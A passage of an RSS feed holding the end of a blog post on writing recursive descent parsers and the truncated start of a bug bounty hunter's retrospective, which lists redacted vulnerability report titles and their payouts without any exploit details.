parsers generally have two significant advantages over all other
real parsers.</p>

<p>The first advantage is that almost always, a recursive descent parser
is the only or at least easiest form of parser you can readily create
using only the language's standard library and tooling. In particular,
parsing LR, LALR, and similar formal grammars generally requires you to
find, select, and install a parser generator tool (or more rarely, an
additional package). Very few languages ship their standard environment
with a parser generator (or a lexer, which is often required in some
form by the parser).</p>

<p>(The closest I know of is C on Unix, where you will almost always
find some version of lex and yacc. Not entirely coincidentally,
I've used lex and yacc to write a parser in C, although a long time
ago.)</p>

<p>By contrast, a recursive descent parser is just code in the language.
You can obviously write that in any language, and you can build a
little lexer to go along with it that's custom fitted to your
particular recursive descent parser and your language's needs.  This
also leads to the second significant advantage, which is that if
you write a recursive descent parser, you don't need to learn a new
language, the language of the parser generator, and also learn how
to hook that new language to the language of your program, and then
debug the result. Your entire recursive descent parser (and your
entire lexer) are written in one language, the language you're
already working in.</p>

<p>If I was routinely working in a language that had a well respected
de facto standard parser generator and lexer, and regularly building
parsers for little languages for my programs, it would probably be
worth mastering these tools. The time and effort required to do so
would be more than paid back in the end, and I would probably have
a higher quality grammar too (Tratt points out how recursive descent
parsers hide ambiguity, for example). But in practice I bounce back
and forth between two languages right now (Go and Python, neither
of which have such a standard parser ecology), and I don't need to
write even a half-baked parser all that often. So writing another
recursive descent parser using my standard process for this has
been the easiest way to do it every time I needed one.</p>

<p>(I've developed a standard process for writing recursive descent
parsers that makes the whole thing pretty mechanical, but that's a
discussion for another entry or really a series of them.)</p>

<p>PS: I can't comment about how easy it is to generate good error
messages in modern parser generators, because I haven't used any
of them. My experience with my own recursive descent parsers is
that it's generally straightforward to get decent error messages
for the style of languages that I create, and usually simple to
tweak the result to give clearer errors in some specific situations
(<a href="https://github.com/siebenmann/sinksmtp/blob/master/rparse.go#L432">eg</a>,
<a href="https://github.com/siebenmann/sinksmtp/blob/master/rparse.go#L575">also</a>).</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/programming/WhyRDParsersForMe</link>
            <guid isPermaLink="false">hacker-news-small-sites-24500860</guid>
            <pubDate>Thu, 17 Sep 2020 03:23:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking on Bug Bounties for Four Years]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24500198">thread link</a>) | @infosecau
<br/>
September 16, 2020 | https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <ul>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#intro">Intro &amp; Motivations</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#findings">Findings</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#analysis">Analysis</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#collaboration">Collaboration</a></li>
  <li><a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/#methodology">Methodology</a></li>
</ul>

<hr>





<p>I value transparency a lot, especially when it comes to the bug bounty space. Bug bounty hunters all around the world are submitting a range of reports where the issues found span across multiple domains, often leveraging numerous techniques and methodologies. However, if you’re not already an active bug bounty hunter who has a good understanding of what a bounty program expects, or will pay out for, you have a major disadvantage compared to someone who does have this knowledge. I hope through this blog post, I can demystify the sort of issues bug bounty programs pay for.</p>

<p>The last blog post I did in this series was around four years ago, <a href="https://shubs.io/high-frequency-security-bug-hunting-120-days-120-bugs/">120 days, 120 bugs</a>. In the last four years, a lot has happened. I moved to Europe for six months, I moved interstate in Australia twice, I won a <a href="https://www.youtube.com/watch?v=VojwIY4GL-4">live hacking event</a>, I co-founded a company and helped build an <a href="https://assetnote.io/">attack surface management platform</a> with a team of people I consider family.</p>

<p>Unlike my previous blog post, I did not set myself a goal to find a bug a day. Instead, I participated in bug bounties whenever time allowed. There were many months where I found nothing at all, which often terrified me when it came to evaluating my self worth as a hacker. I also admitted to myself, that I might be a good hacker, but there is always going to be a better hacker out there, and I’ve made my peace with that as a hyper-competitve person.</p>

<p>If you don’t have an excellent understanding of fundamental application security <a href="http://projects.webappsec.org/w/page/13246978/Threat%20Classification">attacks and weaknesses</a> before you approach bug bounties, in my opinion, you are wasting your time. <a href="https://portswigger.net/web-security">Practice and learn more here</a>.</p>

<p>If you’re looking for a paid, more extensive resource, check out and practice with <a href="https://pentesterlab.com/">PentesterLab</a>.</p>

<p>Participating so heavily in bug bounties has given us the knowledge at Assetnote about what security teams <em>actually</em> care about. It’s the reason we can maintain high signal when we are continuously finding exposures.</p>

<p>My primary motivation for this blog post is to educate the masses on what bug bounty programs are paying out for.</p>

<p>For example, would you know that you could submit a dangling EC2 IP (subdomain pointing to an EC2 IP that is no longer owned by the company) as a bug report without reading the proof in the pudding below? I’ve been paid for this by programs, so clearly they value this sort of information.</p>

<hr>




<p>Below are all of my findings for the last four years. I’ve redacted information where necessary, but by reading the titles, it should give you a good understanding of what I was reporting to programs.</p>

<table data-order="[[ 0, &quot;desc&quot; ]]" id="bugs">
<thead><tr><th title="Field #1">Date</th>
<th title="Field #2">Bug</th>
<th title="Field #3">Payout</th>
</tr></thead>
<tbody><tr>
<td>2020-09-02 14:04:11 UTC</td>
<td>[redacted] Hosted Zone Takeover</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-07-16 18:39:22 UTC</td>
<td>Spring debugging endpoints exposed leading to disclosure of all secrets via heapdump on [redacted] &amp; Account takeover by Trace</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-06-30 22:54:07 UTC</td>
<td>Blind SSRF on [redacted] through invoicing API - access to internal hosts</td>
<td>$60.00</td>
</tr>
<tr>
<td>2020-06-10 13:53:43 UTC</td>
<td>Full Account takeover through subdomain takeover via [redacted]</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-06-10 13:24:10 UTC</td>
<td>Full Account takeover through subdomain takeover via [redacted]</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-06-10 13:21:57 UTC</td>
<td>Full Account takeover through subdomain takeover via  [redacted]</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-06-08 14:28:05 UTC</td>
<td>Amazon S3 Subdomain Hijack - [redacted]</td>
<td>$256.00</td>
</tr>
<tr>
<td>2020-06-08 05:29:58 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-06-05 16:27:42 UTC</td>
<td>Admin panel for Cisco IP Conference Station CP-7937G exposed on the internet on [redacted] IP ranges</td>
<td>$400.00</td>
</tr>
<tr>
<td>2020-06-03 21:07:51 UTC</td>
<td>Pre-auth Blind MSSQL Injection affecting [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-03 14:18:24 UTC</td>
<td>Pre-auth MSSQL Injection affecting [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-02 15:28:50 UTC</td>
<td>Pre-auth SQL Injection affecting [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-02 15:26:58 UTC</td>
<td>RCE via arbitrary file write and path traversal [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-06-02 15:25:08 UTC</td>
<td>RCE via arbitrary file write and path traversal [redacted]</td>
<td>$1,024.00</td>
</tr>
<tr>
<td>2020-05-18 10:12:38 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-18 10:11:58 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-18 10:06:22 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-18 10:05:20 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-05-11 18:47:54 UTC</td>
<td>Route53 Hosted Zone Takeover of [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2020-05-11 14:59:23 UTC</td>
<td>Account takeover through Subdomain Takeover of [redacted] (Cookie Disclosure -&gt; Account Takeover)</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-05-11 14:31:18 UTC</td>
<td>Account takeover through Subdomain Takeover of [redacted] (Cookie Disclosure -&gt; Account Takeover)</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-05-07 01:47:49 UTC</td>
<td>View all metadata for any [redacted] IDOR [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2020-04-29 22:58:57 UTC</td>
<td>IDOR view all [redacted]</td>
<td>$4,000.00</td>
</tr>
<tr>
<td>2020-04-29 22:57:55 UTC</td>
<td>IDOR view the [redacted]</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2020-04-24 18:19:23 UTC</td>
<td>Subdomain takeover of [redacted] through Heroku</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-04-24 18:18:45 UTC</td>
<td>Subdomain takeover of [redacted] through Heroku</td>
<td>$300.00</td>
</tr>
<tr>
<td>2020-04-23 19:45:04 UTC</td>
<td>Ability to horizontal bruteforce [redacted] accounts by abusing [redacted] sign up flow</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-22 17:44:29 UTC</td>
<td>View all metadata for any [redacted] IDOR [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-22 17:42:51 UTC</td>
<td>IDOR view the [redacted] for any [redacted] for today [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-22 17:42:06 UTC</td>
<td>IDOR view all [redacted] for a [redacted] [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-04-06 19:13:19 UTC</td>
<td>Facebook - Payout For [redacted]</td>
<td>$5,000.00</td>
</tr>
<tr>
<td>2020-03-07 15:12:24 UTC</td>
<td>Accessing Querybuilder on [redacted] to gain access to secrets</td>
<td>$3,000.00</td>
</tr>
<tr>
<td>2020-02-25 15:02:20 UTC</td>
<td>Subdomain takeover of [redacted] via Amazon S3</td>
<td>$750.00</td>
</tr>
<tr>
<td>2020-02-20 23:01:58 UTC</td>
<td>HTML injection, DOS of email receipts and potentially template injection within [redacted] via "Expense Info" section</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-02-18 14:45:40 UTC</td>
<td>Admin account bruteforce via [redacted]/libs/granite/core/content/login.html</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-02-15 12:24:57 UTC</td>
<td>Blind XSS via registering on [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2020-02-04 03:45:38 UTC</td>
<td>HTML Injection in email when contributing to a [redacted]</td>
<td>$700.00</td>
</tr>
<tr>
<td>2020-01-21 17:13:58 UTC</td>
<td>Ability to attach malicious attachments (of any name and of any content type) to [redacted] support staff via [redacted]</td>
<td>$2,000.00</td>
</tr>
<tr>
<td>2020-01-15 11:41:59 UTC</td>
<td>No authentication required to view and delete Terraform locks at [redacted]</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-12-12 16:25:11 UTC</td>
<td>[redacted] Webhook URL + object leaked in JavaScript on [redacted]</td>
<td>$3,000.00</td>
</tr>
<tr>
<td>2019-11-21 22:15:20 UTC</td>
<td>AWS &amp; Screenhero JWT Credentials from [redacted] not rotated, still working</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-10-17 13:44:23 UTC</td>
<td>RCE on [redacted] via IBM Aspera exploit leading to compromise of secure file storage </td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-10-15 14:29:25 UTC</td>
<td>SSO bypass on [redacted] leading to access of internal documents and portals</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-10-11 18:07:51 UTC</td>
<td>Admin access to [redacted] via guessing credentials</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-10-11 18:06:15 UTC</td>
<td>3rd party subdomain hijack - EC2 IP of [redacted] is no longer controlled by [redacted]</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-09-30 16:56:50 UTC</td>
<td>Multiple server-side issues affecting [redacted] (SSRF, admin panels)</td>
<td>$2,660.00</td>
</tr>
<tr>
<td>2019-09-25 22:10:00 UTC</td>
<td>Read any [redacted] details using UUID - IDOR in [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-09-10 16:17:59 UTC</td>
<td>SSRF in [redacted]</td>
<td>$2,000.00</td>
</tr>
<tr>
<td>2019-09-03 15:28:36 UTC</td>
<td>SSRF in [redacted]</td>
<td>$17,900.00</td>
</tr>
<tr>
<td>2019-08-29 00:43:00 UTC</td>
<td>Bypassing email whitelists for organisation signup flows on [redacted]</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-08-09 05:15:44 UTC</td>
<td>[Pre-Submission] SSRF in [redacted] (Iframely)</td>
<td>$2,970.30</td>
</tr>
<tr>
<td>2019-07-29 16:32:59 UTC</td>
<td>[Bypass] SSRF via [redacted] leads to internal network access, ability to read internal JSON responses</td>
<td>$23,000.00</td>
</tr>
<tr>
<td>2019-07-24 02:52:42 UTC</td>
<td>PHPInfo exposed at [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2019-07-24 02:46:02 UTC</td>
<td>SSRF on [redacted] leading to AWS breach via security credentials</td>
<td>$5,000.00</td>
</tr>
<tr>
<td>2019-07-08 14:44:23 UTC</td>
<td>Remote command execution on production [redacted] (via tsi parameter) - CVE-2017-12611</td>
<td>$2,000.00</td>
</tr>
<tr>
<td>2019-06-12 17:42:53 UTC</td>
<td>Username/Password for Aspera and other secrets leaked in [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-06-12 17:42:08 UTC</td>
<td>SSO/Authorization bypass for APIs hosted on [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-06-12 14:45:09 UTC</td>
<td>Remote Code Execution (many endpoints) - [redacted]</td>
<td>$4,500.00</td>
</tr>
<tr>
<td>2019-06-10 17:29:35 UTC</td>
<td>Extract email, dob, full address, federal tax ID and other PII for all leads in [redacted]</td>
<td>$1,800.00</td>
</tr>
<tr>
<td>2019-06-10 16:53:22 UTC</td>
<td>Obtain email, mobile of customers of [redacted] by iterating through Lead IDs via the API</td>
<td>$12,600.00</td>
</tr>
<tr>
<td>2019-06-10 16:52:40 UTC</td>
<td>Ability to pull out all opportunities (IDOR) extract PII for customers of [redacted]</td>
<td>$12,600.00</td>
</tr>
<tr>
<td>2019-06-07 18:51:24 UTC</td>
<td>[redacted][IDOR] - Accessing all accounts via regression / new attack vector by abusing [redacted] (regression?)</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2019-06-07 18:17:31 UTC</td>
<td>Blind SSRF on [redacted] through RPC call to checkAvailableLivechatAgents</td>
<td>$62.50</td>
</tr>
<tr>
<td>2019-06-07 18:07:22 UTC</td>
<td>HTML injection in emails when adding a reviewer to [redacted]</td>
<td>$125.00</td>
</tr>
<tr>
<td>2019-06-07 17:42:09 UTC</td>
<td>[IDOR] Impersonating an [redacted] employee via /api/readHandler on [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-06-07 15:33:31 UTC</td>
<td>Extract mobile number and [redacted] using only an email address, for any [redacted]</td>
<td>$750.00</td>
</tr>
<tr>
<td>2019-06-07 14:36:01 UTC</td>
<td>Zendesk Ticket IDOR / Ability to enumerate  IDs via [redacted]</td>
<td>$125.00</td>
</tr>
<tr>
<td>2019-06-07 14:24:15 UTC</td>
<td>Extract mobile number and [redacted] using only an email address, for any [redacted] user</td>
<td>$750.00</td>
</tr>
<tr>
<td>2019-06-07 14:11:20 UTC</td>
<td>HTML Injection in [redacted] receipts if printed from [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2019-06-07 13:56:46 UTC</td>
<td>Ability to access the airwatch admin panels and APIs in [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-06-07 13:21:31 UTC</td>
<td>IDOR on [redacted] allows you to access [redacted] information for any [redacted] user</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-06-07 10:13:20 UTC</td>
<td>[redacted][IDOR] - Accessing all accounts via regression / new attack vector by abusing [redacted] (regression?)</td>
<td>$15,000.00</td>
</tr>
<tr>
<td>2019-05-22 19:33:27 UTC</td>
<td>SQLi and Authentication Bypass in [redacted]</td>
<td>$4,500.00</td>
</tr>
<tr>
<td>2019-04-29 14:14:42 UTC</td>
<td>Reflected XSS in [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2019-04-29 14:14:29 UTC</td>
<td>SSRF in [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-04-25 07:33:22 UTC</td>
<td>Local file disclosure through Rails CVE-2019-5418 in [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2019-04-19 02:28:54 UTC</td>
<td>SSRF - [redacted]</td>
<td>$4,950.00</td>
</tr>
<tr>
<td>2019-04-19 02:28:35 UTC</td>
<td>SSRF at [redacted] via the 'url' parameter</td>
<td>$4,950.00</td>
</tr>
<tr>
<td>2019-03-29 11:23:14 UTC</td>
<td>AWS S3 secrets leaked in [redacted] meeting connector …</td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/">https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24500198</guid>
            <pubDate>Thu, 17 Sep 2020 01:29:10 GMT</pubDate>
        </item>
    </channel>
</rss>
